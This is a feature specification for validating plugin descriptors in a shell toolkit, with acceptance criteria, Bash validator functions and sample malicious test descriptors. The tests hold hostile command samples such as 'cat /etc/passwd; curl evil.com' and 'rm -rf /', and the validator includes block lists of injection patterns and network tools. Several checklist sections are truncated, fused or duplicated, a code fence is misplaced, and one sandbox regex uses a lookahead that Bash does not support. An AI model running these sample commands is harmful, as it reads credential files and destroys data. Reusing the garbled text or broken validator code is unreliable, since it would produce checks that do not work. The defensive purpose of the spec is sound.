# Feature: Plugin Security and Validation

**ID**: 0012  
**Type**: Feature Implementation  
**Status**: Implementing  
**Created**: 2026-02-09  
**Updated**: 2026-02-11 (Moved to implementing)  
**Priority**: Critical (Security)

## Overview
Implement comprehensive plugin descriptor validation, security checks, and integrity verification to prevent malicious or malformed plugins from executing and compromising system security. This feature validates plugins against the unified schema (ADR-0010) and ensures compatibility with mandatory sandboxing (ADR-0009).

## Description
Create a plugin security subsystem that validates plugin descriptors against strict schemas, checks command templates for injection patterns, validates variable substitution security, verifies Bubblewrap sandbox compatibility, detects circular dependencies, validates data type specifications, and enforces security policies before allowing plugin execution. This feature acts as a security gate, preventing malicious plugins from exploiting the plugin architecture.

Plugin security is critical because plugins execute external commands via command templates and access filesystem within sandboxed environments, making them a primary attack surface for the toolkit.

## Business Value
- Prevents command injection attacks through plugin descriptors
- Prevents path traversal attacks from malicious plugins
- Ensures data integrity through schema validation
- Enables safe plugin ecosystem development
- Protects users from malicious third-party plugins
- Critical security foundation for plugin architecture

## Related Requirements
- [req_0047](../../01_vision/02_requirements/03_accepted/req_0047_plugin_descriptor_validation.md) - Plugin Descriptor Validation (PRIMARY - Risk 320)
- [req_0049](../../01_vision/02_requirements/03_accepted/req_0049_template_injection_prevention.md) - Template Injection Prevention
- [req_0052](../../01_vision/02_requirements/03_accepted/req_0052_secure_defaults_and_configuration_hardening.md) - Secure Defaults
- [req_0024](../../01_vision/02_requirements/03_accepted/req_0024_plugin_dependency_graph_construction.md) - Dependency Graph (circular detection)

## Acceptance Criteria

### Schema Validation
- [ ] System validates all required fields present in descriptor: `name`, `description`, `active`
- [ ] System validates command template fields: `commandline`, `check_commandline`, `install_commandline`
- [ ] System validates field types match expected types (string, boolean, array, object)
- [ ] System validates `name` field: alphanumeric + underscore/hyphen only, 3-50 characters
- [ ] System validates `description` field: non-empty, max 500 characters
- [ ] System validates `active` field: boolean true/false
- [ ] System validates `consumes` object: keys are variable names, values are type and description objects
- [ ] System validates `provides` object: keys are variable names, values are type and description objects
- [ ] System validates `processes` object (optional): valid MIME types and extensions
- [ ] System validates unified plugin schema compliance per ADR-0010
- [ ] System validates descriptor schema version compatibility (supports schema evolution)
- [ ] System validates schema version field is present and supported
- [ ] System rejects descriptors with unknown/unexpected fields (strict mode)

### Command Template Security
- [ ] System validates `commandline` field is present and non-empty
- [ ] System validates `check_commandline` field is present and safe
- [ ] System validates `install_commandline` field uses package manager commands only
- [ ] System checks for command injection patterns in all command template fields:
  - Shell metacharacters in unsafe positions: `;`, `|`, `&`, `$()`, `` ` ``
  - Redirection operators: `>`, `>>`, `<` (except controlled output)
  - Unauthorized variable expansion: `$VAR`, `$(...)` patterns
- [ ] System validates command templates use only ${variable_name} substitution format
- [ ] System validates variable names match declared `consumes` field names exactly
- [ ] System validates command templates don't invoke interpreters directly (`bash -c`, `sh -c`, `eval`)
- [ Sandbox Compliance Validation (ADR-0009)
- [ ] System validates command templates are compatible with read-only source filesystem
- [ ] System validates commands don't require network access (network isolation enforced)
- [ ] System validates commands don't require special user privileges or capabilities
- [ ] System validates commands work within restricted process namespace
- [ ] System validates commands are compatible with minimal mounted filesystem view
- [ ] System validates no attempts to write outside /tmp or /var/tmp directories
- [ ] System validates compatibility with Bubblewrap security restrictions
- [ ] System validates plugin files don't reference absolute paths outside workspace
- [ Variable Substitution Validation
- [ ] System validates all variables in command templates use ${variable_name} format
- [ ] System validates variable names are alphanumeric with underscores only
- [ ] System validates no unauthorized variable expansion patterns ($VAR, `command`)
- [ ] System validates variables reference declared `consumes` fields
- [ ] System validates no environment variable leakage in templates
- [ ] System validates proper handling of filenames with special characters
- [ ] System validates variable substitution doesn't enable command injection
- [ ] System reports exact circular dependency chain in error message
- [ ] System rejects plugin set wiobject fields reference valid data types
- [ ] System validates `provides` object fields declare valid data types
- [ ] System validates data field names follow naming conventions (alphanumeric, underscores)
- [ ] System validates no duplicate field names in `provides`
- [ ] System validates type declarations include both type and description
- [ Circular Dependency Detection
- [ ] System detects circular dependencies in `consumes`/`provides` chains
- [ ] System builds dependency graph and validates it's acyclic (DAG)
- [ ] System reports exact circular dependency chain in error message
- [ ] System rejects plugin set with circular dependencies (fail fast)
### File Type Filter Validation
- [ ] System validates `processes.mime_types` contains valid MIME type patterns
- [ ] System validates `processes.file_extensions` contains valid extensions (start with `.`)
- [ ] System validates MIME types against known type list (warn for unknown)
- [ File Type Filter Validation
- [ ] System validates `processes.mime_types` contains valid MIME type patterns
- [ ] System validates `processes.file_extensions` contains valid extensions (start with `.`)
- [ ] System validates MIME types against known type list (warn for unknown)
- [ ] System validates no conflicting file type filters across plugins

### Path Validation
- [ ] System validates plugin directory name matches descriptor `name` field
- [ ] System validates plugin directory is within plugins root (no path traversal)
- [ ] System validates no symlinks to external locations
- [ ] System validates plugin files don't reference absolute paths outside workspace
- [ ] System validates command templates don't reference paths outside plugin directoryicting file type filters across plugins

### Security Policy Enforcement
- [ ] System enforces secure defaults: plugins disabled (`active: false`) until explicitly enabled
- [ ] System requires plugin approval/signature for system-wide installation (future enhancement)
- [ ] System logs all plugin validation failures with details
- [ ] System quarantines invalid plugins (mark as inactive, don't execute)
- [ ] System isolates quarantined plugins in separate directory structure
- [ ] System prevents quarantined plugins from being loaded or executed
- [ ] System provides quarantine management commands (list, restore, purge)
- [ ] System maintains quarantine reason and timestamp for each plugin
- [ ] System provides security audit log of plugin validations
- [ ] System logs validation events with severity levels (CRITICAL, WARN, INFO)
- [ ] System maintains persistent audit trail for compliance and forensic analysis
- [ ] System includes validation context (plugin path, descriptor content hash, timestamp) in audit logs

### Validation Reporting
- [ ] System reports validation errors with specific field and reason
- [ ] System reports validation warnings (non-critical issues)
- [ ] System provides line numbers or field paths for errors
- [ ] System aggregates all validation errors (don't fail on first error)
- [ ] System provides actionable guidance for fixing validation errors

### Error Handling
- [ ] System handles malformed JSON gracefully (report syntax error)
- [ ] System handles missing descriptor files (skip plugin with warning)
- [ ] System handles permission errors reading descriptors
- [ ] System continues validating remaining plugins after encountering errors
- [ ] System exits with error if any CRITICAL validation failures found

## Technical Considerations

### Implementation Approach
```bash
validate_plugin_descriptor() {
  local descriptor_file="$1"
  local plugin_dir=$(dirname "$descriptor_file")
  
  log "DEBUG" "VALIDATOR" "Validating descriptor: $descriptor_file"
  
  # Validate JSON syntax
  if ! jq empty "$descriptor_file" 2>/dev/null; then
    log "ERROR" "VALIDATOR" "Invalid JSON syntax: $descriptor_file"
    return 1
  fi
  
  # Validate required fields
  for field in name description active commandline check_commandline install_commandline; do
    if ! jq -e "has(\"$field\")" "$descriptor_file" >/dev/null; then
      log "ERROR" "VALIDATOR" "Missing required field '$field': $descriptor_file"
      return 1
    fi
  done
  
  # Validate name field
  local plugin_name
  plugin_name=$(jq -r '.name' "$descriptor_file")
  if ! [[ "$plugin_name" =~ ^[a-zA-Z0-9_-]{3,50}$ ]]; then
    log "ERROR" "VALIDATOR" "Invalid plugin name '$plugin_name': must be 3-50 alphanumeric/underscore/hyphen chars"
    return 1
  fi
  
  # Validate command template fields
  local commandline check_commandline install_commandline
  commandline=$(jq -r '.commandline' "$descriptor_file")
  check_commandline=$(jq -r '.check_commandline' "$descriptor_file")
  install_commandline=$(jq -r '.install_commandline' "$descriptor_file")
  
  if ! validate_command_template_safety "$commandline" "commandline"; then
    log "ERROR" "VALIDATOR" "Unsafe command template in $descriptor_file: $commandline"
    return 1
  fi
  
  if ! validate_command_template_safety "$check_commandline" "check_commandline"; then
    log "ERROR" "VALIDATOR" "Unsafe check command in $descriptor_file: $check_commandline"
    return 1
  fi
  
  if ! validate_command_template_safety "$install_commandline" "install_commandline"; then
    log "ERROR" "VALIDATOR" "Unsafe install command in $descriptor_file: $install_commandline"
    return 1
  fi
  
  # Validate variable substitution compatibility
  if ! validate_variable_substitution "$commandline" "$descriptor_file"; then
    return 1
  fi
  
  # Validate consumes/provides objects
  if ! validate_data_objects "$descriptor_file" "consumes"; then
    return 1
  fi
  
  if ! validate_data_objects "$descriptor_file" "provides"; then
    return 1
  fi
  
  # Validate file type filters
  if ! validate_processes_field "$descriptor_file"; then
    return 1
  fi
  
  # Validate plugin directory path
  local plugin_dir_name=$(basename "$plugin_dir")
  if [[ "$plugin_dir_name" != "$plugin_name" ]]; then
    log "WARN" "VALIDATOR" "Plugin directory name '$plugin_dir_name' doesn't match plugin name '$plugin_name'"
  fi
  
  # Validate no path traversal
  if [[ "$plugin_dir" == *".."* ]]; then
    log "ERROR" "VALIDATOR" "Path traversal detected in plugin directory: $plugin_dir"
    return 1
  fi
  
  # Validate sandbox compatibility
  if ! validate_sandbox_compatibility "$commandline"; then
    log "ERROR" "VALIDATOR" "Command incompatible with sandbox restrictions: $commandline"
    return 1
  fi
  
  log "INFO" "VALIDATOR" "Plugin validated successfully: $plugin_name"
  return 0
}

validate_command_template_safety() {
  local command="$1"
  local field_name="$2"
  
  # Check for command injection patterns
  local unsafe_patterns=(
    ';'          # Command chaining
    '&&'         # Logical AND
    '||'         # Logical OR
    '$('         # Command substitution
    '`'          # Backtick substitution
    'eval'       # Eval command
    'bash -c'    # Shell invocation
    'sh -c'      # Shell invocation
  )
  
  for pattern in "${unsafe_patterns[@]}"; do
    if [[ "$command" == *"$pattern"* ]]; then
      log "ERROR" "VALIDATOR" "Unsafe pattern '$pattern' detected in $field_name"
      return 1
    fi
  done
  
  # Check for unauthorized variable patterns
  if [[ "$command" =~ \$[A-Z_]+ ]] && [[ "$field_name" != "check_commandline" ]]; then
    log "ERROR" "VALIDATOR" "Unauthorized environment variable usage in $field_name"
    return 1
  fi
  
  # Special validation for install commands
  if [[ "$field_name" == "install_commandline" ]]; then
    if ! [[ "$command" =~ (apt|yum|dnf|pacman|brew|true|:) ]]; then
      log "ERROR" "VALIDATOR" "Install command must use package manager: $command"
      return 1
    fi
  fi
  
  return 0
}

validate_variable_substitution() {
  local command="$1"
  local descriptor_file="$2"
  
  # Extract variables from command template
  local variables=()
  while [[ "$command" =~ \$\{([^}]+)\} ]]; do
    variables+=("${BASH_REMATCH[1]}")
    command="${command/${BASH_REMATCH[0]}/}"
  done
  
  # Check that all variables are declared in consumes
  for var in "${variables[@]}"; do
    if ! jq -e ".consumes.${var}" "$descriptor_file" >/dev/null; then
      log "ERROR" "VALIDATOR" "Variable '$var' not declared in consumes object"
      return 1
    fi
  done
  
  return 0
}

validate_data_objects() {
  local descriptor_file="$1"
  local field_type="$2"  # consumes or provides
  
  if ! jq -e ".$field_type" "$descriptor_file" >/dev/null; then
    # Empty object is valid
    return 0
  fi
  
  # Validate each field has type and description
  local field_names=()
  mapfile -t field_names < <(jq -r ".$field_type | keys[]" "$descriptor_file")
  
  for field_name in "${field_names[@]}"; do
    if ! [[ "$field_name" =~ ^[a-zA-Z_][a-zA-Z0-9_]*$ ]]; then
      log "ERROR" "VALIDATOR" "Invalid field name '$field_name' in $field_type"
      return 1
    fi
    
    # Validate type and description fields exist
    if ! jq -e ".$field_type.$field_name.type" "$descriptor_file" >/dev/null; then
      log "ERROR" "VALIDATOR" "Missing type for field '$field_name' in $field_type"
      return 1
    fi
    
    if ! jq -e ".$field_type.$field_name.description" "$descriptor_file" >/dev/null; then
      log "ERROR" "VALIDATOR" "Missing description for field '$field_name' in $field_type"
      return 1
    fi
    
    # Validate type is valid
    local field_type_val
    field_type_val=$(jq -r ".$field_type.$field_name.type" "$descriptor_file")
    if [[ "$field_type_val" != "string" && "$field_type_val" != "integer" && "$field_type_val" != "boolean" ]]; then
      log "ERROR" "VALIDATOR" "Invalid type '$field_type_val' for field '$field_name'"
      return 1
    fi
  done
  
  return 0
}

validate_sandbox_compatibility() {
  local command="$1"
  
  # Check for operations incompatible with sandbox
  local sandbox_violations=(
    '/proc/'     # Process filesystem access
    '/sys/'      # System filesystem access
    '/dev/(?!stdin|stdout|stderr|null|zero|random|urandom)'  # Device access
    'mount'      # Mount operations
    'chroot'     # Change root
    'sudo'       # Privilege escalation
  )
  
  for violation in "${sandbox_violations[@]}"; do
    if [[ "$command" =~ $violation ]]; then
      log "ERROR" "VALIDATOR" "Sandbox violation detected: $violation"
      return 1
    fi
  done
  
  # Check for network access attempts
  if [[ "$command" =~ (curl|wget|nc|telnet|ssh|ftp) ]]; then
    log "WARN" "VALIDATOR" "Command may require network access (blocked in sandbox): $command"
  fi
  
  return 0
}
```

validate_processes_field() {
  local descriptor_file="$1"
  
  # Check if processes field exists
  if ! jq -e 'has("processes")' "$descriptor_file" >/dev/null; then
    # Optional field, absence is valid
    return 0
  fi
  
  # Validate MIME types
  if jq -e '.processes.mime_types' "$descriptor_file" >/dev/null; then
    local -a mime_types
    mapfile -t mime_types < <(jq -r '.processes.mime_types[]' "$descriptor_file")
    
    for mime in "${mime_types[@]}"; do
      if ! [[ "$mime" =~ ^[a-z]+/[a-z0-9+.-]+$ ]]; then
        log "WARN" "VALIDATOR" "Invalid MIME type format: $mime"
      fi
    done
  fi
  
  # Validate extensions
  if jq -e '.processes.file_extensions' "$descriptor_file" >/dev/null; then
    local -a extensions
    mapfile -t extensions < <(jq -r '.processes.file_extensions[]' "$descriptor_file")
    
    for ext in "${extensions[@]}"; do
      if ! [[ "$ext" =~ ^\.[a-zA-Z0-9]+$ ]]; then
        log "ERROR" "VALIDATOR" "Invalid file extension format: $ext (must start with '.')"
        return 1
      fi
    done
  fi
  
  return 0
}

detect_circular_dependencies() {
  local plugins_dir="$1"
  
  # Build dependency graph from all plugin descriptors
  declare -A graph         # graph[plugin_name]="consumer1,consumer2,..."
  declare -A in_degree     # in_degree[plugin_name]=count
  declare -A plugin_provides # plugin_provides[data_field]=plugin_name
  
  log "DEBUG" "VALIDATOR" "Building dependency graph from $plugins_dir"
  
  # Step 1: Build provides mapping and initialize in_degree
  for descriptor in "$plugins_dir"/**/descriptor.json; do
    [[ -f "$descriptor" ]] || continue
    
    local plugin_name
    plugin_name=$(jq -r '.name' "$descriptor" 2>/dev/null) || continue
    
    # Initialize in-degree
    in_degree["$plugin_name"]=0
    
    # Map provided data fields to plugin
    local provides_fields
    provides_fields=$(jq -r '.provides | keys[]' "$descriptor" 2>/dev/null) || true
    while IFS= read -r field; do
      [[ -n "$field" ]] && plugin_provides["$field"]="$plugin_name"
    done <<< "$provides_fields"
  done
  
  # Step 2: Build dependency graph and calculate in-degrees
  for descriptor in "$plugins_dir"/**/descriptor.json; do
    [[ -f "$descriptor" ]] || continue
    
    local plugin_name
    plugin_name=$(jq -r '.name' "$descriptor" 2>/dev/null) || continue
    
    local dependencies=()
    local consumes_fields
    consumes_fields=$(jq -r '.consumes | keys[]' "$descriptor" 2>/dev/null) || true
    
    # Find plugins that provide required data fields
    while IFS= read -r field; do
      [[ -n "$field" ]] || continue
      local provider="${plugin_provides[$field]}"
      if [[ -n "$provider" && "$provider" != "$plugin_name" ]]; then
        dependencies+=("$provider")
        ((in_degree["$plugin_name"]++))
      fi
    done <<< "$consumes_fields"
    
    # Store dependencies
    IFS=',' graph["$plugin_name"]="${dependencies[*]}"
  done
  
  # Step 3: Kahn's algorithm for cycle detection
  local queue=()
  local processed=()
  
  # Find nodes with in-degree 0
  for plugin in "${!in_degree[@]}"; do
    if [[ ${in_degree[$plugin]} -eq 0 ]]; then
      queue+=("$plugin")
    fi
  done
  
  # Process queue
  while [[ ${#queue[@]} -gt 0 ]]; do
    local current="${queue[0]}"
    queue=("${queue[@]:1}")  # Remove first element
    processed+=("$current")
    
    # Process dependencies
    IFS=',' read -ra deps <<< "${graph[$current]}"
    for dep in "${deps[@]}"; do
      [[ -n "$dep" ]] || continue
      ((in_degree["$dep"]--)) || true
      if [[ ${in_degree[$dep]} -eq 0 ]]; then
        queue+=("$dep")
      fi
    done
  done
  
  # Check if all plugins processed (no cycles)
  if [[ ${#processed[@]} -eq ${#in_degree[@]} ]]; then
    log "INFO" "VALIDATOR" "No circular dependencies detected"
    return 0
  fi
  
  # Find and report circular dependency
  log "ERROR" "VALIDATOR" "Circular dependency detected!"
  for plugin in "${!in_degree[@]}"; do
    if [[ ${in_degree[$plugin]} -gt 0 ]]; then
      log "ERROR" "VALIDATOR" "Plugin in cycle: $plugin (remaining in-degree: ${in_degree[$plugin]})"
    fi
  done
  
  return 1
}
```

### Security Tests
```bash
# Test command template with variable substitution
{
  "name": "malicious",
  "description": "Malicious plugin",
  "active": true,
  "commandline": "cat /etc/passwd; curl evil.com",
  "check_commandline": "which cat",
  "install_commandline": "true",
  "consumes": {},
  "provides": {"data": {"type": "string", "description": "Malicious data"}}
}
# Expected: Validation failure (command injection detected)

# Test variable injection
{
  "name": "variable_injection",
  "description": "Variable injection attempt",
  "active": true,
  "commandline": "stat ${file_path} && rm -rf /",
  "check_commandline": "which stat",
  "install_commandline": "true",
  "consumes": {"file_path": {"type": "string", "description": "File path"}},
  "provides": {}
}
# Expected: Validation failure (command chaining detected)

# Test valid plugin
{
  "name": "safe_plugin",
  "description": "Safe plugin",
  "active": true,
  "commandline": "stat -c '%s,%Y,%U' \"${file_path_absolute}\"",
  "check_commandline": "which stat",
  "install_commandline": "true",
  "consumes": {
    "file_path_absolute": {
      "type": "string",
      "description": "Absolute path to file"
    }
  },
  "provides": {
    "file_size": {"type": "integer", "description": "File size in bytes"},
    "file_modified": {"type": "integer", "description": "Last modified timestamp"},
    "file_owner": {"type": "string", "description": "File owner"}
  }
}
# Expected: Validation success
```

### Integration Points
- **Plugin Manager**: Validates descriptors during plugin discovery
- **Execution Orchestrator**: Only executes validated plugins
- **Security Logging**: Records validation failures

### Dependencies
- Plugin discovery (feature_0003) ✅
- Logging infrastructure (feature_0001) ✅

### Performance Considerations
- Cache validation results (validate once per plugin load)
- Efficient regex matching for pattern detection
- Quick-fail validation (stop on critical errors)

### Security Considerations
- Fail-secure: Invalid plugins are NOT executed
- Comprehensive validation (defense-in-depth)
- Clear audit trail of validation events
- No bypass mechanisms
- Regular security review of validation rules

## Dependencies
- Requires: Basic script structure (feature_0001) ✅
- Requires: Plugin listing (feature_0003) ✅
- Blocks: Plugin execution (feature_0009) - must validate before execution

## Testing Strategy
- Unit tests: Schema validation for all field types
- Unit tests: Command injection pattern detection
- Unit tests: Path validation and traversal detection
- Unit tests: Circular dependency detection
- Security tests: Malicious descriptor attempts
- Security tests: Boundary cases (max lengths, special characters)
- Integration tests: Valid plugin acceptance
- Integration tests: Invalid plugin rejection

## Definition of Done
- [ ] All acceptance criteria met
- [ ] Unit tests passing with >90% coverage
- [ ] Security tests passing (injection prevention)
- [ ] Code reviewed and security approved
- [ ] Documentation updated (security policies, validation rules)
- [ ] Security audit completed
- [ ] Penetration testing performed
